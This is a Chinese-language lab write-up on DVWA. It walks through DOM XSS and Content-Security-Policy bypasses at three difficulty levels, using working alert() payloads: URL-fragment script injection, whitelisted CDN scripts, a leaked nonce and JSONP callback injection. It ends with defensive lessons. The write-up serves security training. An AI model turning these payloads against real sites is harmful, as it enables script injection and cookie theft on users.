DVWA-XSS进阶学习

一、DOM XSS

1、和存储型与反射型的区别

反射型 XSS：URL ?name=<script> → 服务器收到   → 返回 HTML → 浏览器执行

存储型 XSS：留言板 POST       → 数据库存着   → 别人访问   → 浏览器执行

DOM XSS：URL #<script>      → 服务器没收到 → 浏览器本地 JS 直接执行

关键：DOM XSS 的Payload藏在 # 后面，# 后面的内容不会发到服务器，纯前端JS 读 location.hash 然后拼到HTML里。服务端日志完全看不到，蓝队盲区。

2、Low级

直接改URL：

http://localhost/dvwa/vulnerabilities/xss_d/#<script>alert('DOM XSS')</script>

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_001.png)

然后点 Select 按键

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_002.png)

原理：Low 源码直接用 document.write(location.hash) 把 # 后面的内容写进页面，没有任何过滤。

3、Medium级

1）先查看源码

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_003.png)

stripos 三个关键点：

str +  i  = 大小写不敏感（ stripos 不是 strpos）

检查的是 "<script" 这个子串（注意：没有闭合的 > 和没有 </script>）

!== false = 只要 URL 里包含 <script（不区分大小写），就重定向回 ?default=English

结论：大写 <SCRIPT> 也没用，因为  i  标志忽略大小写。<script 这条路彻底堵死。

2）所以可以用 <SCRIPT>，也可以用 <img onerror> 或者 <img onload>

这里用 <img onerror> 演示

URL：http://localhost/dvwa/vulnerabilities/xss_d/#<img src=x onerror=alert(1)>

然后点 Select

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_004.png)

3）#<img src=x onerror=alert('DOM XSS')>

因为"DOM和XSS"之间有空格，所以无法成功

#<img src=x onerror=alert('DOMXSS')>     #去掉空格就行了

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_005.png)

4）但是如果是 #<script>alert(1)</script>，也会成功弹出弹窗

因为 # 片段不会被发到服务器：

完整 URL:    ?default=English#<script>alert('XSS dom')</script>

↑服务器 $_GET['default'] 只收到这个 = "English"

↑# 后面的内容服务器根本收不到！

所以：

服务器 $_GET['default'] = "English"

stripos("English", "<script") → false（不包含）→ 通过 ✅

1．Medium 的 stripos 检查的是服务器收到的参数，而 <script> 藏在  #  片段里，根本就没发给服务器，所以过滤形同虚设。

2．然后浏览器端的 JS 用 document.location.href 读取完整 URL（包括  #  后面的部分），通过 document.write 写进页面，<script> 就执行了。

3．DOM XSS 的 # 绕过原理：

?default=English#<script>alert(1)</script>

↑                     ↑

服务器看到的（="English"）   服务器看不到（纯浏览器端）

过滤检查通过                  浏览器 JS 读取并执行

DOM XSS 的 # 片段天然绕过服务端过滤，因为片段根本不会发到服务器。这就是 DOM XSS 比反射型/存储型更难防御的原因之一

4、High级

1）查看源码

这是白名单机制--不再是之前的"黑名单过滤"，而是"只允许这四个值"：
![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_006.png)

允许：French / English / German / Spanish

其他任何值 → 重定向回 ?default=English

关键点：switch 检查的是 $_GET['default']，也就是服务器收到的参数。你之前的 #<script> 绕过在这里依然有效，因为：

?default=English#<script>alert(1)</script>

↑服务器 $_GET['default'] = "English" → 在白名单里 → 放行 ✅

↑# 后面的 <script> 服务器看不见

2）直接用 #<script>alert(1)</script> 就行

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_007.png)

照样弹窗，因为：

服务器看到 default=English → 白名单通过

# 后面的 <script> 服务器收不到

浏览器 JS 读完整 URL → 执行 <script>

5、总结

1）三种防御思路的进化

| 级别 | 防御方式 | 类型 | 怎么绕 |
|---|---|---|---|
| Low | 无过滤 | 无 | 直接 <script> |
| Medium | stripos 查 <script | 黑名单 | # 片段绕过（服务器看不到） |
| High | switch 白名单 | 白名单 | # 片段绕过（服务器只看到 English） |

核心认知：

黑名单（Medium）堵"坏的东西" → 总有漏网之鱼

白名单（High）只放"好的东西" → 更安全，但只检查服务器收到的参数

DOM XSS 的 # 片段绕过：payload 在浏览器端，服务器怎么防都拦不住 # 后面的内容

二、CSP Bypass

1、CSP的含义

CSP = HTTP 响应头告诉浏览器"只能执行这些来源的脚本"：

Content-Security-Policy: script-src 'self' cdn.example.com

- CSP 能防御的：内联 <script>、onerror 事件（如果策略没开 'unsafe-inline'）

- CSP 防不了的：白名单域名上的可控接口（如 JSONP、文件上传）

2、Low级

1）源码分析

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_008.png)

没有 CSP:          <script>alert(1)</script> → 浏览器直接执行 ✅

有 CSP 的页面:     Content-Security-Policy: script-src 'self'

<script>alert(1)</script> → 浏览器拒绝执行 ❌

Content-Security-Policy: script-src 'self'

https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;

含义：浏览器只允许执行来自这些白名单域名的脚本。你往页面上贴内联<script>是没用的，但是用 <script src="白名单域名"> 就合法了

2）解法

注意：源代码里有两行注释掉的URL那个是作者给的提示，那两个URL就是白名单的

- https://cdn.jsdelivr.net/gh/digininja/csp_bypass/alert.js

- https://unpkg.com/@digininja/csp_bypass@1.0.0/index.js

这两个都在白名单里（cdn.jsdelivr.net 和 unpkg.com），而且内容就是弹窗。

- 在输入框输入 https://unpkg.com/@digininja/csp_bypass@1.0.0/index.js

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_009.png)

理解链路:

你输入: https://unpkg.com/@digininja/csp_bypass@1.0.0/index.js

↓

PHP: <script src="https://unpkg.com/.../index.js"></script>  ← 拼进页面

↓

浏览器: 这个 src 在 unpkg.com → CSP 白名单允许 ✅

↓

加载并执行该 JS → alert 弹窗 💥

- 如果现成的URL用不了也可以自己打造一个

比如pastebin也在白名单内

- 打开pastebin.com

- 在New Paste区域，内容框里贴：

alert(document,cookie)  或者  alert('CSP Bypassed!')

- 在下拉框 Syntax Highlighting 中选择 JavaScript

- 点击Create New Paste

- 拿到Raw链接(跳转到的链接要在中间加个raw/)

但是你弄的Pastebin不一定会成功

因为浏览器对 <script src> 加载的脚本有严格 MIME 类型检查：

pastebin 的 raw 页面返回的 Content-Type 是:  text/plain（纯文本）

浏览器要求脚本的 Content-Type 必须是:        application/javascript

text/plain ≠ application/javascript

→ 浏览器拒绝执行 ❌

所以就算 CSP 放行了 pastebin.com，浏览器也因为脚本"不是 JS 类型"而拒绝执行。

3、Medium级

1）源码分析

$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXJZXg29pbmcpgD8gZ212ZSB5b3UgZXBs3UgXdXA='";

header($headerCSP);

header("X-XSS-Protection: 0");

# <script nonce="TmV2ZXJZXg29pbmcpgD8gZ212ZSB5b3UgZXBs3UgXdXA=">alert(1)</script>

关键点：

CSP 用了 nonce（一次性随机数）：script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXJ...'

nonce 的值直接就写在源码的注释里了，作者把它当"答案"留在了注释中

X-XSS-Protection: 0 禁用了浏览器自带的 XSS 过滤器

2）解法：用注释里现成的nonce

<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_010.png)

为什么能弹： 你的 <script> 带了 nonce，且 nonce 值和 CSP 声明的一致 → 浏览器放行 → 执行 alert(1)

CSP nonce 机制：

- 原理：给合法的 <script> 贴一个随机 nonce，CSP 只放行带正确 nonce 的脚本

- 本意：nonce 每次请求随机生成，攻击者猜不到 → 堵死内联脚本注入

- 漏洞：nonce 硬编码在源码注释里 → 等于把钥匙挂在门上 🔑

- 绕过：把 nonce 抄进自己的 <script> 标签 → 获得合法身份

本质：nonce 机制的安全前提是"nonce 每次变且不可预测"， 一旦写死/泄露，就形同虚设。

4、High级

1）源码分析

1. $headerCSP = "Content-Security-Policy: script-src 'self';";

'self' 意味着：浏览器只执行来自本站（localhost）的脚本文件。

之前的所有招式都失效了：

❌ 外部域名（pastebin/unpkg）→ 不在白名单

❌ 内联 <script> → 不允许（没有 'unsafe-inline'）

❌ nonce → 没有 nonce 机制

但源码暴露了真正的漏洞点

看页面提示和JS：

<p>The page makes a call to .../source/jsonp.php to load some code. Modify that page to run your own code.</p>

<p>1+2+3+4+5=<span id="answer"></span></p>

<input type="button" id="solve" value="Solve the sum" />

<script src="source/high.js"></script>

关键：页面调用本站的 jsonp.php，用 JSONP 方式加载代码。

// high.js

s.src = "source/jsonp.php?callback=solveSum";  // 带 callback 参数

JSONP 原理（这是 High 级绕过的核心）：

jsonp.php?callback=solveSum

↓

服务器返回: solveSum({"answer": 15})   ← 把 callback 值包起来返回

↓

浏览器把返回内容当 JS 执行 → 调用 solveSum 函数

2）页面结构

high.php                              ← 设置 CSP 头 + 输出页面

└── high.js                       ← JS 脚本，创建 <script> 标签

└── jsonp.php?callback=solveSum   ← 返回 JS 代码被浏览器执行

页面没有输入框，只有一个 "Solve the sum" 按钮，点击后触发 high.js 加载 jsonp.php。

3）绕过思路：JSONP回调注入

漏洞点1：jsonp.php的callback参数无过滤

// jsonp.php 源码

$callback = $_GET['callback'];       // 直接取参数，不验证

echo $callback . "(" . json_encode($outp) . ")";  // 原样输出

jsonp.php 的 callback 参数是可控的，而且它属于本站（ 'self' 允许）。如果 callback 参数没过滤，你可以让它输出恶意代码。

- 先访问这个URL看看会返回什么：

http://localhost/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_011.png)

返回了 solveSum({"answer":"15"})

- 然后试试把 callback 参数直接改成XSS payload：

http://localhost/dvwa/vulnerabilities/csp/source/jsonp.php?callback=alert(1)

![](images/3-DVWA-XSS学习-进阶/3-DVWA-XSS学习-进阶_012.png)

返回 alert(1)({...}) 或类似可执行的，就说明callback参数可注入。

漏洞点2：jsonp.php属于本站（'self'源）

CSP只允许 'self' ，而 jsonp.php 正好是本站文件 → CSP放行。

- 绕过方法：

直接修改 jsonp.php 文件内容（因为提示说 "Modify that page to run your own code"）：

// 修改前

echo $callback . "(" . json_encode($outp) . ")";

// 修改后

echo "alert(1)";

- 执行链路：

点击 "Solve the sum"

↓

high.js 创建 <script src="source/jsonp.php?callback=solveSum">

↓

浏览器加载 jsonp.php（'self' 源 → CSP 放行 ✅）

↓

返回 alert(1) → 浏览器执行 → 弹窗 💥

4）总结

| 防御手段 | 绕过方式 | 关键教训 |
|---|---|---|
| script-src 'self' | 修改同源文件（jsonp.php） | CSP 只防外部，不防内部文件被篡改 |
| JSONP 回调无过滤 | callback 参数注入任意代码 | 所有回调参数必须做白名单验证 |

一句话：'self' 再严格，如果本站文件本身可以被修改，CSP 就形同虚设。

三、防御思路

| 级别 | CSP 策略 | 防御逻辑 | 绕过方式 |
|---|---|---|---|
| Low | 白名单一堆外部域名 | 只信这些域名 | 找白名单域名托管 JS |
| Medium | 'unsafe-inline' + nonce | 内联脚本需带 nonce | nonce 写在注释里，直接抄 |
| High | script-src  'self' | 只信本站脚本 | 改本站的 jsonp.php |

防御的时候要记住：

白名单要精简 — 多信一个域名，就多一个攻击面

nonce 要随机 — 写死在注释里等于没设

本站文件也要保护 — 'self' 再严，文件本身被篡改也白搭
